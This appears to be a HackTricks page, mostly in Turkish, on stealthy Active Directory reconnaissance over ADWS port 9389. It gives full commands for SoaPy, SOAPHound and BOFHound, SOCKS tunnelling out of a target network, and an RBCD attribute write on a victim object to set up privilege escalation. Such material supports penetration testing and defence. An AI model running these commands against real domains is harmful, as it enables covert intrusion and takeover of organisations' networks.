# Active Directory Web Services (ADWS) Keşif & Gizli Toplama

{{#include ../../banners/hacktricks-training.md}}

## ADWS nedir?

Active Directory Web Services (ADWS), Windows Server 2008 R2'den beri her Domain Controller'da varsayılan olarak **etkinleştirilmiştir** ve TCP **9389** üzerinde dinler. İsminin aksine, **HTTP kullanılmaz**. Bunun yerine servis, LDAP tarzı veriyi bir dizi özel .NET çerçeve protokolü aracılığıyla açığa çıkarır:

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Bu trafiğin ikili SOAP çerçeveleri içinde kapsüllenmiş olması ve nadir kullanılan bir port üzerinden gitmesi nedeniyle, **ADWS üzerinden yapılan keşfin klasik LDAP/389 & 636 trafiğine kıyasla incelenme, filtrelenme veya imza tabanlı tespitten geçme olasılığı çok daha düşüktür**. Operatörler için bunun anlamı:

* Daha gizli keşif – Blue teams genellikle LDAP sorgularına odaklanır.
* 9389/TCP'yi bir SOCKS proxy üzerinden tünelleyerek Windows olmayan host'lardan (Linux, macOS) toplama imkanı.
* LDAP ile elde edeceğiniz aynı veriler (kullanıcılar, gruplar, ACL'ler, şema, vb.) ve **yazma** yapabilme yeteneği (ör. `msDs-AllowedToActOnBehalfOfOtherIdentity` ile **RBCD**).

ADWS etkileşimleri WS-Enumeration üzerinden uygulanır: her sorgu LDAP filtre/özniteliklerini tanımlayan bir `Enumerate` mesajı ile başlar ve bir `EnumerationContext` GUID döner; bunu sunucu tarafından tanımlanan sonuç penceresine kadar akış yapan bir veya daha fazla `Pull` mesajı izler. Context'lerin süresi yaklaşık ~30 dakika sonra dolar, bu nedenle araçların sonuçları sayfalaması veya durumu kaybetmemek için filtreleri bölmesi (her CN için prefix sorguları) gerekir. Güvenlik tanımlayıcıları istendiğinde SACL'leri hariç tutmak için `LDAP_SERVER_SD_FLAGS_OID` kontrolünü belirtin; aksi takdirde ADWS SOAP yanıtından `nTSecurityDescriptor` özniteliğini basitçe çıkarır.

> NOT: ADWS birçok RSAT GUI/PowerShell aracı tarafından da kullanılır, bu yüzden trafik meşru admin etkinliğiyle karışabilir.

## SoaPy – Native Python İstemcisi

[SoaPy](https://github.com/logangoins/soapy) is a **full re-implementation of the ADWS protocol stack in pure Python**. It crafts the NBFX/NBFSE/NNS/NMF frames byte-for-byte, allowing collection from Unix-like systems without touching the .NET runtime.

### Temel Özellikler

* Supports **proxying through SOCKS** (useful from C2 implants).
* Fine-grained search filters identical to LDAP `-q '(objectClass=user)'`.
* Optional **write** operations ( `--set` / `--delete` ).
* **BOFHound output mode** for direct ingestion into BloodHound.
* `--parse` flag to prettify timestamps / `userAccountControl` when human readability is required.

### Hedefe yönelik toplama bayrakları & yazma işlemleri

SoaPy, ADWS üzerinde en yaygın LDAP avcılığı görevlerini tekrarlayan özenle seçilmiş seçeneklerle gelir: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, artı özel çekimler için ham `--query` / `--filter` düğmeleri. Bunları şu yazma ilkelikleriyle eşleştirin: `--rbcd <source>` (sets `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging for targeted Kerberoasting) ve `--asrep` (flip `DONT_REQ_PREAUTH` in `userAccountControl`).

Sadece `samAccountName` ve `servicePrincipalName` döndüren örnek hedeflenmiş SPN araması:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Aynı host/kimlik bilgilerini kullanarak bulguları hemen istismar edin: RBCD-özellikli nesneleri `--rbcds` ile döküp, ardından Resource-Based Constrained Delegation zincirini sahnelemek için `--rbcd 'WEBSRV01$' --account 'FILE01$'` uygulayın (tam suiistimal yolu için bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

### Kurulum (operatör hostu)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## SOAPHound – High-Volume ADWS Collection (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) ADWS içinde tüm LDAP etkileşimlerini tutan ve BloodHound v4-uyumlu JSON üreten bir .NET toplayıcısıdır. Bir kez `objectSid`, `objectGUID`, `distinguishedName` ve `objectClass`'in tam bir önbelleğini (`--buildcache`) oluşturur, ardından yüksek hacimli `--bhdump`, `--certdump` (ADCS) veya `--dnsdump` (AD-integrated DNS) geçişleri için yeniden kullanır; böylece DC'den yalnızca yaklaşık 35 kritik öznitelik çıkar. AutoSplit (`--autosplit --threshold <N>`) büyük ormanlarda 30 dakikalık EnumerationContext zaman aşımının altında kalmak için sorguları CN önekine göre otomatik olarak parçalar.

Etki alanına katılmış bir operatör VM'sinde tipik iş akışı:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Dışa aktarılan JSON'lar doğrudan SharpHound/BloodHound iş akışlarına aktarılabilir—sonraki grafikleme fikirleri için [BloodHound methodology](bloodhound.md) bölümüne bakın. AutoSplit, sorgu sayısını ADExplorer-style snapshots'a göre daha düşük tutarken SOAPHound'u milyonlarca nesne içeren forest'larda dayanıklı kılar.

## Gizli AD Toplama İş Akışı

Aşağıdaki iş akışı, ADWS üzerinden **etki alanı & ADCS nesnelerini** nasıl keşfedeceğinizi, bunları BloodHound JSON'a nasıl dönüştüreceğinizi ve sertifika tabanlı saldırı yollarını nasıl arayacağınızı — hepsi Linux'tan — gösterir:

1. **Hedef ağdan kutunuza 9389/TCP tünelleyin** (ör. via Chisel, Meterpreter, SSH dynamic port-forward, vb.).  `export HTTPS_PROXY=socks5://127.0.0.1:1080` komutunu çalıştırın veya SoaPy’s `--proxyHost/--proxyPort` seçeneklerini kullanın.

2. **Kök etki alanı nesnesini toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Configuration NC'den ADCS ile ilgili nesneleri toplayın:**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **BloodHound'a dönüştür:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **ZIP'i BloodHound GUI'ye yükleyin** ve `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` gibi cypher sorguları çalıştırarak sertifika yükseltme yollarını (ESC1, ESC8, vb.) ortaya çıkarın.

### `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD) Yazma
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Bunu tam bir **Resource-Based Constrained Delegation** zinciri için `s4u2proxy`/`Rubeus /getticket` ile birleştirin (bkz. [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Araç Özeti

| Amaç | Araç | Notlar |
|---------|------|-------|
| ADWS keşfi | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, read/write |
| Yüksek hacimli ADWS dump | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, BH/ADCS/DNS modes |
| BloodHound ingest | [BOFHound](https://github.com/bohops/BOFHound) | Converts SoaPy/ldapsearch logs |
| Sertifika ele geçirilmesi | [Certipy](https://github.com/ly4k/Certipy) | Can be proxied through same SOCKS |

## Kaynaklar

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
